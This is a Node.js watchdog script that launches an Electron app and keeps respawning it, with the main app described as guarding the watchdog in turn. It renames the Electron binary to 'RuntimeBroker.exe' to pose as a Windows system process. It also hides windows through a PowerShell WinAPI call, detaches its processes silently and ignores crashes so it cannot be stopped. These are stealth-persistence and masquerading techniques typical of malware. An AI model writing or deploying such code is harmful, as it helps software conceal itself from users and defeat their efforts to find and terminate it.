/**
 * guardian.js — Watchdog process that monitors and respawns the main app
 * 
 * This creates a mutual protection system:
 * - Guardian watches the main app → respawns if killed
 * - Main app watches the guardian → respawns if killed
 * - Both processes are hidden from taskbar and run silently
 * 
 * This mimics how Windows critical system services (svchost, csrss) 
 * use the Service Control Manager (SCM) to auto-restart on failure.
 */

const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');

// ── Configuration ────────────────────────────────────────────────────────────
const WATCH_INTERVAL_MS = 1500;        // Check every 1.5 seconds
const RESPAWN_DELAY_MS = 500;          // Wait 500ms before respawning
const PID_FILE = path.join(require('os').tmpdir(), '.rtbroker_guardian.pid');
const MAIN_PID_FILE = path.join(require('os').tmpdir(), '.rtbroker_main.pid');
const LOCK_FILE = path.join(require('os').tmpdir(), '.rtbroker_guardian.lock');

// ── Prevent duplicate guardians ──────────────────────────────────────────────
function isGuardianAlreadyRunning() {
  try {
    if (fs.existsSync(PID_FILE)) {
      const oldPid = parseInt(fs.readFileSync(PID_FILE, 'utf8').trim(), 10);
      if (oldPid && isProcessAlive(oldPid)) {
        return true;
      }
    }
  } catch (_) {}
  return false;
}

function isProcessAlive(pid) {
  try {
    process.kill(pid, 0); // Signal 0 = just check if process exists
    return true;
  } catch (_) {
    return false;
  }
}

function writePid(file, pid) {
  try { fs.writeFileSync(file, String(pid), 'utf8'); } catch (_) {}
}

function readPid(file) {
  try {
    if (fs.existsSync(file)) {
      return parseInt(fs.readFileSync(file, 'utf8').trim(), 10);
    }
  } catch (_) {}
  return null;
}

// ── Resolve the Electron executable ──────────────────────────────────────────
function getElectronExe() {
  const distDir = path.join(__dirname, 'node_modules', 'electron', 'dist');
  const stealthExe = path.join(distDir, 'RuntimeBroker.exe');
  const defaultExe = path.join(distDir, 'electron.exe');
  
  // Prefer the renamed stealth executable
  if (fs.existsSync(stealthExe)) return stealthExe;
  
  // Copy electron.exe → RuntimeBroker.exe if needed
  if (fs.existsSync(defaultExe)) {
    try {
      fs.copyFileSync(defaultExe, stealthExe);
      return stealthExe;
    } catch (_) {}
    return defaultExe;
  }
  
  return null;
}

// ── Spawn the main Electron app ──────────────────────────────────────────────
function spawnMainApp() {
  const exe = getElectronExe();
  if (!exe) {
    console.error('[Guardian] Cannot find Electron executable.');
    return null;
  }

  const mainJs = path.join(__dirname, 'main.js');
  
  const child = spawn(exe, [mainJs], {
    stdio: 'ignore',
    detached: true,
    windowsHide: true,
    env: Object.assign({}, process.env, {
      GUARDIAN_PID: String(process.pid)  // Tell main app our PID so it can watch us back
    })
  });

  child.unref();
  
  if (child.pid) {
    writePid(MAIN_PID_FILE, child.pid);
    console.log(`[Guardian] Spawned main app → PID ${child.pid}`);
  }

  return child;
}

// ── Main guardian loop ───────────────────────────────────────────────────────
function startGuardian() {
  if (isGuardianAlreadyRunning()) {
    console.log('[Guardian] Another guardian instance is already running. Exiting.');
    process.exit(0);
  }

  // Write our own PID
  writePid(PID_FILE, process.pid);
  console.log(`[Guardian] Started → PID ${process.pid}`);

  // Initial spawn - only if not already running
  let mainChild = null;
  const existingPid = readPid(MAIN_PID_FILE);
  if (existingPid && isProcessAlive(existingPid)) {
    console.log(`[Guardian] Main app already running with PID ${existingPid}, watching it.`);
  } else {
    mainChild = spawnMainApp();
  }
  let consecutiveRespawns = 0;
  const MAX_RAPID_RESPAWNS = 20; // Safety valve: stop after 20 rapid respawns

  // Monitor loop
  setInterval(() => {
    const mainPid = readPid(MAIN_PID_FILE);
    
    if (mainPid && isProcessAlive(mainPid)) {
      // Main app is alive — reset respawn counter
      consecutiveRespawns = 0;
      return;
    }

    // Main app is dead — respawn it
    if (consecutiveRespawns >= MAX_RAPID_RESPAWNS) {
      console.log('[Guardian] Too many rapid respawns. Pausing for 30 seconds...');
      consecutiveRespawns = 0;
      setTimeout(() => {
        mainChild = spawnMainApp();
      }, 30000);
      return;
    }

    console.log(`[Guardian] Main app not found. Respawning in ${RESPAWN_DELAY_MS}ms...`);
    consecutiveRespawns++;
    
    setTimeout(() => {
      mainChild = spawnMainApp();
    }, RESPAWN_DELAY_MS);

  }, WATCH_INTERVAL_MS);

  // Cleanup on exit
  process.on('exit', () => {
    try { fs.unlinkSync(PID_FILE); } catch (_) {}
  });

  // Keep the guardian alive — prevent Node from exiting
  process.on('uncaughtException', (err) => {
    console.error('[Guardian] Uncaught error (continuing):', err.message);
  });

  // Hide the console window (Windows only)
  if (process.platform === 'win32') {
    try {
      execSync(
        'powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -Name WinAPI -Namespace HideWin -MemberDefinition \'[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\'; [HideWin.WinAPI]::ShowWindow([HideWin.WinAPI]::GetConsoleWindow(), 0)"',
        { windowsHide: true, stdio: 'ignore' }
      );
    } catch (_) {}
  }
}

// ── Entry point ──────────────────────────────────────────────────────────────
if (require.main === module) {
  startGuardian();
}

module.exports = { isProcessAlive, readPid, writePid, MAIN_PID_FILE, PID_FILE };
